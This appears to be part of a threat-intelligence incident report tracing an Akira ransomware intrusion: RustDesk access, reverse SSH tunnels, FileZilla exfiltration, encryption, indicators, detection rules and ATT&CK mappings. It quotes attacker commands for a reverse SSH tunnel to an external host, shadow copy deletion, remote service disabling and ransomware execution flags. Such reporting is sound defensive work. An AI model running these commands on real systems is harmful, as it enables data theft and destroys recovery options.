On day three, the threat actor re-entered the environment via RustDesk on a primary server. Although the RustDesk process was already resident in the system tray, a Windows Security Event 4624 was recorded, showing an interactive logon (Type 2) from the localhost address (127.0.0.1). This event was immediately followed by the execution of the RustDesk connection manager, confirming that the threat actor had established a remote desktop session to the endpoint.

"C:\Program Files\RustDesk\RustDesk.exe" --cm
Additionally, RustDesk logs on the host show clipboard and screen-sharing activity consistent with an interactive remote desktop session, lasting for several hours.

Reverse SSH tunnel

On day three, the threat actor performed lateral movement from the initial server to a domain controller via RDP. Once on the DC, the threat actor leveraged the built-in Windows SSH client to establish a reverse tunnel to a remote host, effectively proxying subsequent malicious activity through this encrypted channel. This same reverse SSH tunneling technique was later identified on a separate Windows server on day five.

However, SSH traffic was only observed between the domain controller and the external IP on day three.

We also tracked login activity to the domain controller from a Kali Linux host shortly following the creation of the reverse SSH tunnel.

Swisscom observed the same technique; however, in this case, the threat actor accessed a different IP address:
ssh -p22 [email protected] [.]60 -R 5554

## Exfiltration

The first notable transfer occurred after the establishment of the first reverse SSH tunnel on a domain controller. Network flow analysis revealed approximately 2.5GB of data transferred from the domain controller to the threat actor controlled server at 193[.]242[.]184[.]150 over port 22. The transfer occurred over a concentrated time period shortly after the tunnel was established, consistent with bulk data exfiltration.

Analysis of Windows Event ID 5145 logs on Domain Controller A revealed the threat actor accessed the domain’s SYSVOL share at the same time that we see the ~2.5GB transfer initiate, indicating that SYSVOL data was likely exfiltrated. SYSVOL contains Group Policy Objects, login scripts, and domain-wide configurations. By accessing SYSVOL, the threat actor would have gained visibility into the organization’s security posture and Active Directory infrastructure.

FileZilla was the primary method of exfiltration during this intrusion with the initial transfer taking place on the third day, roughly 39 hours after initial access. After executing C:\\ProgramData\\FileZilla_3.68.1_win64_sponsored2-setup.exe , the threat actor proceeded to connect to 185[.]174[.]100[.]203:22 to exfiltrate data. No file compression or specific harvesting tactics were observed, so it is likely the threat actor was just indiscriminately exfiltrating files from network shares; perhaps based on the names of the files/folders. The only collection methods observed showed a big interest in user data and credential gathering, likely to either sell the data or to be used by the threat actor for additional follow-on attacks.

While the source of the FileZilla installer could not be identified, we were able to surface file creation logs that show explorer.exe as the responsible process. Considering that RDP was used throughout this intrusion, and there were rdpclip executions just before FileZilla execution on the File Sever, it is likely this executable was transferred via RDP clipboard from the threat actor’s machine to the File Server.
"_timestamp": REDACTED, "Image": C:\Windows\Explorer.EXE, "TargetFilename": C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe, "ProcessGuid": {7992d2de-71d7-6873-9387-010000000e00}, "message": File created: RuleName: - UtcTime: REDACTED ProcessGuid: {7992d2de-71d7-6873-9387-010000000e00} ProcessId: 10560 Image: C:\Windows\Explorer.EXE TargetFilename: C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe CreationUtcTime: REDACTED User: <FILE SERVER>\Administrator
Note that the naming of this FileZilla executable is not unusual and this is the expected naming convention used for their free version installers.

Analysis of Zeek logs show that roughly 77GB of data was transferred out of the victim network via two unique sessions originating from FileZilla. As stated earlier in the collection section, at least a portion of this was user credential data. Review of FileZilla’s recentservers.xml log file shows the username Stark was used. Logon type 2 indicates the password is prompted and manually entered each time and is not saved locally. Protocol 1 confirms SFTP protocol was used.

SSH Exfiltration Sessions to 185.174.100.203:22

Session 1: CTXU3p4hyiBMiOHgta (Data Transfer #1)
Source: <FILE SERVER>:60368 Destination: 185.174.100.203:22 (Ukraine, AS-COLOCROSSING) Timestamp: REDACTED Duration: 16,362 seconds (~4.5 hours) Data Transferred: 39,282,787,186 bytes (39.28 GB) Connection Details: Protocol: SSH over TCP State: RSTO (Connection established, originator aborted with RST) SSH Client: SSH-2.0-FileZilla_3.68.1 SSH Server: SSH-2.0-OpenSSH_for_Windows_9.8 Win32-OpenSSH-GitHub
Session 2: C5YTxCs9PfDHuCQLd (Data Transfer #2)
Source: <FILE SERVER>:60367
Destination: 185.174.100.203:22 (Ukraine, AS-COLOCROSSING)
Timestamp: REDACTED
Duration: 16,733 seconds (~4.6 hours)
Data Transferred: 41,177,980,833 bytes (41.77 GB)

Connection Details:
Protocol: SSH over TCP
State: RSTO (Connection established, originator aborted with RST)
SSH Client: SSH-2.0-FileZilla_3.68.1
SSH Server: SSH-2.0-OpenSSH_for_Windows_9.8 Win32-OpenSSH-GitHub

## Impact

Data Encryption

Approximately 44 hours after the initial compromise, the threat actor initiated the Akira ransomware deployment, beginning with the backup server. The binary, staged as C:\ProgramData\locker.exe , was executed using the following parameters: locker.exe -p=G:\ -n=15 . In this context, the -p flag defines the target encryption path, while -n determines the percentage of each file to be encrypted—a tactic often used to speed up the encryption process.

On the file server, the threat actor uninstalled FileZilla, likely to remove evidence of exfiltration, before executing the ransomware locally. From the domain controller, the threat actor utilized remote execution flags to target and encrypt network shares, followed by several additional passes across various directories to maximize the impact of the deployment.

The threat actor monitored encryption progress by reviewing log files generated by the ransomware.

On day five, the threat actor re-entered the environment via RustDesk, pivoting to the child domain controller via RDP. Once positioned, the threat actor executed the ransomware binary 39 times on that specific domain controller.

Shadow Copy Deletion

The Akira ransomware binary automated the deletion of Volume Shadow Copies upon execution, leveraging WMI to trigger a PowerShell command. On every impacted host, each locker.exe instance was followed by a shadow copy deletion within approximately one second:
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"

### Swisscom

Nine hours after gaining initial access, the threat actor initiated the ransomware deployment, beginning with the domain controller and subsequently propagating to additional servers.

Prior to the encryption phase, the threat actor performed a coordinated service termination to ensure that database files and web services were unlocked and accessible for encryption. Using WMIC, they targeted every host listed in hosts1.txt to disable and terminate services associated with SQL and IIS:

- Service Disabling
wmic /node:@C:\temp\hosts1.txt /failfast:on service where "Name Like '%sql%'" call ChangeStartmode Disabledwmic /node:@C:\temp\hosts1.txt /failfast:on service where "Name Like '%iis%'" call ChangeStartmode Disabled
- Process Termination
wmic /node:@C:\temp1\hosts.txt /failfast:on process where "CommandLine Like '%sql%'" delete
The ransomware payload, renamed as win.exe , was staged in the C:\ProgramData directory and executed with the following parameters: .\win.exe -n=2 netonly . The use of the -n=2 flag indicates a specific encryption threshold, while the netonly argument was likely used to focus the impact on network-accessible resources and shares.

## Timeline

## Diamond Model

## Indicators

### Atomic
opmanager[.]pro
download-center[.]online
ev2sirbd269o5j[.]org - BumbleBee
2rxyt8yrhq0bgj[.]org - BumbleBee
d1hmxkpwby0d4s[.]org - BumbleBee
yj6jurm5qqkye5[.]org - BumbleBee
ewujsfb1dp5ran[.]org - BumbleBee
8doj8uvx604eck[.]org - BumbleBee
kwywztxoo2xdot[.]org - BumbleBee
ky1d1p1daahe5t[.]org - BumbleBee
ovh1kn1tcqw5kp[.]org - BumbleBee
6cimu4mc085em8[.]org - BumbleBee
5ka8rxp6t6eup2[.]org - BumbleBee
ks501oz9nm3v05[.]org - BumbleBee
v5rjsdqogstopr[.]org - BumbleBee

192.121.22.94 - BumbleBee
109.205.195.211 - BumbleBee
188.40.187.145 - BumbleBee
171.22.183.43 - BumbleBee
194.127.178.21 - BumbleBee
172.96.137.160 - AdaptixC2
193.242.184.150 - Reverse SSH Tunnel
185.174.100.203 - Exfil Server

### Computed
ManageEngine-OpManager.msi
124a48b78060fa851e1cc077ca35713c
ab82bf27132323861810c0efcac6d5dd01600dd4
186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da

msimg32.dll
ca8646dfc88423bb9fffda811160cebe
febbaf5f08a8e0782ffcce8beef1f2b4e249a52b
a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331

locker.exe
8c113b3aa82c81eee7c6b4ed0ba9a90f
d66944e1a57daf04d3e809f22cd01946d593acaf
de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d

## Detections

### Network
2056726 : ET MALWARE BumbleBee Loader CnC Checkin 2056727 : ET MALWARE BumbleBee Loader CnC Server Response 2027174 : ET INFO Command Shell Activity Over SMB - Possible Lateral Movement 2047702 : ET INFO External IP Lookup Domain (ipify .org) in DNS Lookup 2047703 : ET INFO External IP Address Lookup Domain (ipify .org) in TLS SNI 2027267 : ET INFO Possible Lateral Movement - File Creation Request in Remote System32 Directory 2043343 : ET INFO RustDesk Domain in DNS Lookup 2044076 : ET INFO RustDesk Relay Domain in DNS Lookup 2025701 : ET INFO SMB2 NT Create AndX Request For an Executable File 2025703 : ET INFO SMB2 NT Create AndX Request For an Executable File In a Temp Directory 2027182 : ET INFO WMIC WMI Request Over SMB - Likely Lateral Movement 2027189 : ET NETBIOS DCERPC DCOM ExecuteShellCommand Call 2851485 : ETPRO INFO SMB/DCERPC Bind_ack with Big-Endian Assoc Group 2851484 : ETPRO INFO SMB/DCERPC Bind_ack with Endian Flipped

### Sigma

Search rules on detection.fyi or sigmasearchengine.com

DFIR Report Private Ruleset :
410f5c82-1fec-42d0-9552-7d9d885517b2 : Veeam Credential Dumping via PostgreSQL psql 637ab586-af22-4be2-9100-215952232f65 : DNS Zone Enumeration and Export via PowerShell e20f9b0e-b4af-40b7-8a9d-eaed7f61d4cd : LSASS Enumeration Followed by Memory Dump - Correlation Rule 9c4034f6-d413-49e1-b257-419775a14736 : Multiple DGA DNS Queries - Correlation Rule
Sigma Repo:
646ea171-dded-4578-8a4d-65e9822892e3 : Process Memory Dump Via Comsvcs.DLL
4ac1f50b-3bd0-4968-902d-868b4647937e : DPAPI Domain Backup Key Extraction
87df9ee1-5416-453a-8a08-e8d4a51e9ce1 : Delete Volume Shadow Copies Via WMI With PowerShell
05a2ab7e-ce11-4b63-86db-ab32e763e11d : MMC Spawning Windows Shell
fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c : PowerShell Base64 Encoded FromBase64String Cmdlet
ca2092a1-c273-4878-9b4b-0d60115bf5ea : Suspicious Encoded PowerShell Command Line
b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c : Suspicious PowerShell Encoded Command Patterns
8a582fe2-0882-4b89-a82a-da6b2dc32937 : Suspicious WmiPrvSE Child Process
c7c8aa1c-5aff-408e-828b-998e3620b341 : MSI Installation From Suspicious Locations
2aa0a6b4-a865-495b-ab51-c28249537b75 : Startup Folder File Write
8e0bb260-d4b2-4fff-bb8d-3f82118e6892 : Potentially Suspicious CMD Shell Output Redirect
178e615d-e666-498b-9630-9ed363038101 : Elevated System Shell Spawned From Uncommon Parent Location
61065c72-5d7d-44ef-bf41-6a36684b545f : Elevated System Shell Spawned
4f4eaa9f-5ad4-410c-a4be-bc6132b0175a : CMD Shell Output Redirect
a24e5861-c6ca-4fde-a93c-ba9256feddf0 : Uncommon Process Access Rights For Target Image
241e802a-b65e-484f-88cd-c2dc10f9206d : Read Contents From Stdin Via Cmd.EXE
d21374ff-f574-44a7-9998-4a8c8bf33d7d : WmiPrvSE Spawned A Process
502b42de-4306-40b4-9596-6f590c81f073 : Local Accounts Discovery
e28a5a99-da44-436d-b7a0-2afc20a5f413 : Whoami Utility Execution
bd8b828d-0dca-48e1-8a63-8a58ecf2644f : Group Membership Reconnaissance Via Whoami.EXE
0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo
903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution
5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE
183e7ea8-ac4b-4c23-9aec-b3dac4e401ac : Net.EXE Execution
d95de845-b83c-4a9a-8a6a-4fc802ebf6c0 : Suspicious Group And Account Reconnaissance Activity Using Net.EXE
cd219ff3-fa99-45d4-8380-a7d15116c6dc : New User Created Via Net.EXE
8eef149c-bd26-49f2-9e5a-9b00e3af499b : Pass the Hash Activity 2
4d07b1f4-cb00-4470-b9f8-b0191d48ff52 : DNS Query To Remote Access Software Domain From Non-Browser App
fb843269-508c-4b76-8b8d-88679db22ce7 : Suspicious Execution of Powershell with Base64
692f0bec-83ba-4d04-af7e-e884a96059b6 : Potential WMI Lateral Movement WmiPrvSE Spawned PowerShell
d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6 : Unusually Long PowerShell CommandLine
42f595c8-7223-43b1-93d3-0349a851a535 : PowerShell Get-Process LSASS in ScriptBlock
5b768e71-86f2-4879-b448-81061cbae951 : Suspicious Manipulation Of Default Accounts Via Net.EXE

### YARA
AdaptixC2_listener_beacon_http
AdaptixC2_listener_beacon_http_var2
BumblebeeC2
CAPE_Bumblebee2024
DITEKSHEN_MALWARE_Win_Akira
MALPEDIA_Win_Bumblebee_Auto
Multi_Ransomware_Akira_21842eb3
SECUINFRA_SUSP_Powershell_Base64_Decode
SIGNATURE_BASE_MAL_WIN_Akira_Apr25
SIGNATURE_BASE_SUSP_PS1_JAB_Pattern_Jun22_1
SUSP_PS1_JAB_Pattern_Jun22_1
Windows_Ransomware_Akira_c8c298ba
Windows_Trojan_Adaptix_b2cda978
Windows_Trojan_Bumblebee_35f50bea
win_bumblebee_auto

## MITRE ATT&CK

Create Account - T1136 Credentials from Password Stores - T1555 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Distributed Component Object Model - T1021.003 DLL - T1574.001 Domain Account - T1087.002 Domain Generation Algorithms - T1568.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Drive-by Compromise - T1189 Exfiltration Over C2 Channel - T1041 Exfiltration Over Symmetric Encrypted Non-C2 Protocol - T1048.001 File and Directory Discovery - T1083 Inhibit System Recovery - T1490 Local Account - T1087.001 Local Groups - T1069.001 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerading - T1036 Network Service Discovery - T1046 Network Share Discovery - T1135 NTDS - T1003.003 PowerShell - T1059.001 Process Injection - T1055 Proxy - T1090 Remote Access Tools - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Service Execution - T1569.002 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Management Instrumentation - T1047 Windows Service - T1543.003 File Deletion - T1070.004 Command Obfuscation - T1027.010
Internal case #TB36726 #PR40373

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
